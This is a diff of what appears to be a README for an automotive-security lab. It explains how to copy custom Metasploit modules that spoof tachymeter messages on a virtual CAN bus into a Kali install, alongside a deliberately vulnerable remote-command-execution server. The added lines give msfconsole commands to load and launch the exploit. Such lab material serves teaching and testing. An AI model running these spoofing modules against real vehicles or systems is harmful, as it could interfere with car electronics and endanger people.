@@ -33,18 +33,30 @@ At this point you need to start the vulnerable server for remote command executi
 ```
 Now your VM is ready and vulnerable for the exploit.
 ### How to setup the exploit on Kali Linux
+You can follow 2 ways:
+
 On Kali Linux, copy the:
 
   */exploit/remote/crazytachymeter_remote.rb* --> to --> */usr/share/metasploit-framework/modules/auxiliary/spoof/replay/*
 
-  OR (if you've already got a session and you don't need a vulnerable server)
+  **OR** (if you have already a metasploit session and you don't need a vulnerable server)
   */exploit/crazytachymeter.rb* --> to --> */usr/share/metasploit-framework/modules/post/hardware/automotive/*
   
   Then copy the
   
   */exploit/controlUnitMapCanBus.txt*  --> to --> */usr/share/metasploit-framework/data/wordlists/controlUnitMapCanBus.txt*
 
-After that, open the msfconsole and then, enter the following commands:
+
+After that, based on the choice of the exploit in the previous step, you can run:
+```
+  use use auxiliary/spoof/replay/crazytachymeter_remote 
+  set interface vcan0
+  set rhost IPVictim
+  set rport python_server_port_number
+  exploit
+```
+**OR** (if you have already a metasploit session and you don't need a vulnerable server) you can run:
+
 ```
   use post/hardware/automotive/crazytachymeter 
   set INTERFACE canbusinterface (e.g. vcan0)
